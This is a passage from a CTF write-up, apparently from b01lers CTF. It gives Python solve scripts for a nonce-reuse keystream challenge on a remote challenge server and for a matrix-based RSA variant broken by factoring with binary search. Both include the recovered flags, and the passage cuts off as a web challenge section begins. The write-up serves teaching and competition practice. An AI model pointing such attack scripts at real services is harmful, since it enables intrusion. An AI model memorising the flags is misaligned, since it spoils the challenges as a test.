<span class="line"><span style="color:var(--astro-code-token-comment)"># r = process(["python3", "chal.py"])</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">r </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> remote</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"gold.b01le.rs"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">5002</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvuntil</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Treat or Trick, count my thing. \n"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">ciphertext </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">strip</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">send</span><span style="color:var(--astro-code-token-punctuation)">((</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"0"</span><span style="color:var(--astro-code-token-keyword)"> *</span><span style="color:var(--astro-code-token-function)"> len</span><span style="color:var(--astro-code-token-punctuation)">(ciphertext) </span><span style="color:var(--astro-code-token-keyword)">+</span><span style="color:var(--astro-code-token-keyword)"> b</span><span style="color:var(--astro-code-token-string-expression)">"\n"</span><span style="color:var(--astro-code-token-punctuation)">) </span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-punctuation)"> (</span><span style="color:var(--astro-code-token-constant)">257</span><span style="color:var(--astro-code-token-keyword)"> -</span><span style="color:var(--astro-code-token-constant)"> 2</span><span style="color:var(--astro-code-token-keyword)"> +</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-punctuation)">))</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">257</span><span style="color:var(--astro-code-token-punctuation)">):</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">    # print("Step", i)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvuntil</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Give me something to encrypt: "</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">    # r.sendline(b"0" * len(ciphertext))</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    keystream </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">strip</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">==</span><span style="color:var(--astro-code-token-constant)"> 256</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">long_to_bytes</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">bytes_to_long</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">bytes</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">fromhex</span><span style="color:var(--astro-code-token-punctuation)">(ciphertext)) </span><span style="color:var(--astro-code-token-keyword)">^</span><span style="color:var(--astro-code-token-function)"> bytes_to_long</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">bytes</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">fromhex</span><span style="color:var(--astro-code-token-punctuation)">(keystream.</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">()))).</span><span style="color:var(--astro-code-token-function)">decode</span><span style="color:var(--astro-code-token-punctuation)">())</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{there_is_a_reason_for_random_nonce_and_with_fixed_length_8c6bf5a1398d1f1d95f1}</span></span>
<span class="line"></span></code></pre>
<h2 id="cryptofetus-rsa">crypto/Fetus-RSA</h2>
<p>We can factorize <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> using binary search as <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>p</mi><mn>3</mn></msub><mo separator="true">,</mo><msub><mi>p</mi><mn>4</mn></msub><mo separator="true">,</mo><msub><mi>p</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">p_2, p_3, p_4, p_5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> are uniquely determined once <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">p_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> is fixed.
Once we factorized <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>, we will get <code>topG</code> by determining <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span> after finding the order of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>GL</mtext><mo stretchy="false">(</mo><mn>5</mn><mo separator="true">,</mo><mi mathvariant="double-struck">Z</mi><mi mathvariant="normal">/</mi><mi>n</mi><mi mathvariant="double-struck">Z</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{GL}(5, \mathbb{Z}/n\mathbb{Z})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">GL</span></span><span class="mopen">(</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathbb">Z</span><span class="mord">/</span><span class="mord mathnormal">n</span><span class="mord mathbb">Z</span><span class="mclose">)</span></span></span></span></p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> Crypto</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">Util</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">number </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-token-keyword)"> *</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">n </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 515034877787990680304726859216098826737559607654653680536655175803818486402820694536785452537613547240092505793262824199243610743308333164103851365420630137187276313271869670701737383708742526677</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">e </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 31337</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">bottomG </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> matrix</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">Zmod</span><span style="color:var(--astro-code-token-punctuation)">(n), [[</span><span style="color:var(--astro-code-token-constant)">247714609729115034577268860647809503348452679955541765864525644036519903244610407544592438833012659821363982836831477850927621505723503202914955484784761468695340160789629882004055804409080695867</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">331625142917011732363496584111977497826539848810596405639715608289185491230192921594585113936516744954068559616963395888825085234835086592835782522823153199824647815923311303312529222423487842184</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">55437288185949549641415195099137917985198178875175317590356850868652628068256771878957686344008331498612071069691453711091201145528626750365270496738628725699281809961803599963127434726167609435</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">514660916099185196031776141538776359410382339048282799109733569738126784171011249457518653961429789338579350043906060924939800730829826389077489637524528092592193187169747629063004980325000389554</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">432908737089369750416720813650504950741227543859957288298129130571557758647818791153409184252564534925607409378801765727301405467691263041798341098982058861749568674152447781841703730861074171486</span><span style="color:var(--astro-code-token-punctuation)">],</span></span>
<span class="line"><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-token-constant)">104171307746966345345857299403770324392522334886728513788970028646835780770090370816961277474173463662053179135418083415763603092683905102293259569143230591686555033557056635683615214642425173517</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">281995809329109899498417283591516891672267505291547187769414960759245222376040526984420670509684233818236456944690830422135256653807646369718495017051487254128669606210585168140190305476396414836</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">448210297704655248563230644309382726474650012116320871206976601497778210586480264554625801730855872456388662647389829317946932942681549854741993522145903386318540208729036379511878276729211658861</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">399193502999265141959383452857091791757532600793923480036782294759164203783245516880539439411508616363396395258745387111132143827593272610961260623660064934154238955120293971424750525097551648180</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">448909699677346701183758951038319440723583288307818355958233994863175886710495171317606803723159576428485212274726596045235998230677229224379125716760136092533604817049730746550292371970711497032</span><span style="color:var(--astro-code-token-punctuation)">],</span></span>
<span class="line"><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-token-constant)">10383824979618791372207750490225860866360446289011667617367731854443817405025701872398853456038612719059056477356275566409859556622099910727870579661815727983662245805512246175424036918556245316</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">3042212133475156282375315438954933898496627384941849067508473136817427432524109900983912625376319043681252528210663860374506706029777992048856493297280439498831646567645849063286941560111486091</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">303901520908845557762276355500926092138935908381564097855093945643653520650021074626397106363589843089839561176214123648988682404983806374183953260408815900582907133898417354283905163971086566554</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">385414980407334346707284477209921028250475161696209076212214696858828374481374774762344617183479700018626970039426895699261230837253656355202103718574806419224338390036737550645417315148014935208</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">172437598435610362668691083369422058178612127588567286669952095014310724933793758671802664372505747578789080527221296229242137567445447449560987571505575740311394634799579166058011734727404038041</span><span style="color:var(--astro-code-token-punctuation)">],</span></span>
<span class="line"><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-token-constant)">459726837943530454128170171077760511486009487765694189770202436458018005866133157577824055980174845256397040485330898693944501922148000904627621334536523927325451030816598478315788682056071758797</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">318766645374831072244114015670117551595181174553017703335802708316885112551395705202907958737214488185739954176085085611052360624160681549561415131064529778955941226762589967588568203157586014646</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">485361005374731090711430490780588207888099824436671620066599360058262282812311497518237782819588602409946446254729349547214950452718084694554650900064587640931729162822096611158015732013679765115</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">442488981185685119421099225895492967006907103880489001122993678677306129218035946328038537612725434883858276836497639772750576738969390151812664236525222680918250542360570252193283310559820113337</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">294017672174100375503817924437430140826863578191649796300540064690169411498877218939778928997294952104395700469268399214549954967540991489929488976904050382049934179672641195866868009511101289284</span><span style="color:var(--astro-code-token-punctuation)">],</span></span>
<span class="line"><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-token-constant)">394288980150370144394508377797340867635320394706221783789360450886862330500083595146934277232717671435601428999455723360437715407992902972393377872146437245909234935183690525050686313034961250106</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">174537062539250527750306397111216900339583030576848484858177223085331307339246744122607759453386390209872407563526999813562242756044330978624067706177762337375480164381575660119163723806663394768</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">167378817268639407255382001659131271694745168867873206910416580974376327982114272760583238198872032832961214636912981493082249850676384736073683786291369414678559758485110038329085571864758144806</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">479478683656492256273719495784577239188841595512723735000697935028851355713461770920044121053505358284609828319371252306609569657211738503902322975549066701614139339082341370785743668742796520457</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)">468925056254460005965810812432459057693038841264871939568448625553319440670497244388153862616274082271409346691280049609288322448351851208172939513793874861880752049454593563028452119997997329883</span><span style="color:var(--astro-code-token-punctuation)">]])</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">def</span><span style="color:var(--astro-code-token-function)"> nextPrime</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-parameter)">p</span><span style="color:var(--astro-code-color-text)">):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-token-function)"> isPrime</span><span style="color:var(--astro-code-token-punctuation)">(p):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        return</span><span style="color:var(--astro-code-color-text)"> p</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    else</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        return</span><span style="color:var(--astro-code-token-function)"> nextPrime</span><span style="color:var(--astro-code-token-punctuation)">(p</span><span style="color:var(--astro-code-token-keyword)">+</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">def</span><span style="color:var(--astro-code-token-function)"> factorize</span><span style="color:var(--astro-code-color-text)">():</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    lb </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-keyword)">&#x3C;&#x3C;</span><span style="color:var(--astro-code-token-constant)">127</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    ub </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-keyword)">&#x3C;&#x3C;</span><span style="color:var(--astro-code-token-constant)">128</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    while</span><span style="color:var(--astro-code-token-function)"> abs</span><span style="color:var(--astro-code-token-punctuation)">(lb</span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-punctuation)">ub)</span><span style="color:var(--astro-code-token-keyword)"> ></span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        x </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> (lb</span><span style="color:var(--astro-code-token-keyword)">+</span><span style="color:var(--astro-code-color-text)">ub)</span><span style="color:var(--astro-code-token-keyword)">//</span><span style="color:var(--astro-code-token-constant)">2</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(x)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        p1 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> nextPrime</span><span style="color:var(--astro-code-token-punctuation)">(x)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        p2 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> nextPrime</span><span style="color:var(--astro-code-token-punctuation)">(p1</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        p3 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> nextPrime</span><span style="color:var(--astro-code-token-punctuation)">(p2</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-constant)">3</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        p4 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> nextPrime</span><span style="color:var(--astro-code-token-punctuation)">(p3</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-constant)">3</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        p5 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> nextPrime</span><span style="color:var(--astro-code-token-punctuation)">(p4</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-token-constant)">7</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        n_ </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> p1</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-color-text)">p2</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-color-text)">p3</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-color-text)">p4</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-color-text)">p5</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        if</span><span style="color:var(--astro-code-color-text)"> n </span><span style="color:var(--astro-code-token-keyword)">></span><span style="color:var(--astro-code-color-text)"> n_</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            lb </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> x</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        elif</span><span style="color:var(--astro-code-color-text)"> n </span><span style="color:var(--astro-code-token-keyword)">&#x3C;</span><span style="color:var(--astro-code-color-text)"> n_</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            ub </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> x</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        else</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">            return</span><span style="color:var(--astro-code-color-text)"> p1</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> p2</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> p3</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> p4</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> p5</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">p1</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> p2</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> p3</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> p4</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> p5 </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> factorize</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">assert</span><span style="color:var(--astro-code-color-text)"> n </span><span style="color:var(--astro-code-token-keyword)">==</span><span style="color:var(--astro-code-color-text)"> p1</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-color-text)">p1</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-color-text)">p3</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-color-text)">p4</span><span style="color:var(--astro-code-token-keyword)">*</span><span style="color:var(--astro-code-color-text)">p5</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">qs </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> [p1</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> p3</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> p4</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-color-text)"> p5]</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">order </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> q </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-color-text)"> qs</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    for</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">5</span><span style="color:var(--astro-code-token-punctuation)">):</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        order </span><span style="color:var(--astro-code-token-keyword)">*=</span><span style="color:var(--astro-code-color-text)"> q</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-token-constant)">5</span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-color-text)">q</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-color-text)">i</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">d </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> pow</span><span style="color:var(--astro-code-token-punctuation)">(e, </span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, order)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">topG </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> bottomG</span><span style="color:var(--astro-code-token-keyword)">**</span><span style="color:var(--astro-code-color-text)">d</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">flag </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> b</span><span style="color:var(--astro-code-token-string-expression)">""</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> row </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-color-text)"> topG</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    for</span><span style="color:var(--astro-code-color-text)"> num </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-color-text)"> row</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        num </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> int</span><span style="color:var(--astro-code-token-punctuation)">(num)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        flag </span><span style="color:var(--astro-code-token-keyword)">+=</span><span style="color:var(--astro-code-token-function)"> long_to_bytes</span><span style="color:var(--astro-code-token-punctuation)">(num)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(flag)</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)"># bctf{c0ngr4ts_y0u_35c4p3d_th3_m4tr1c3s, but really how? what color is your honda civic? sorry i just need to make this long.}</span></span>
<span class="line"></span></code></pre>
<h2 id="webimagehost">web/imagehost</h2>
<ol>
<li>Generate RS256 public key as <code>public.pem</code> and private key as <code>private.pem</code>.</li>
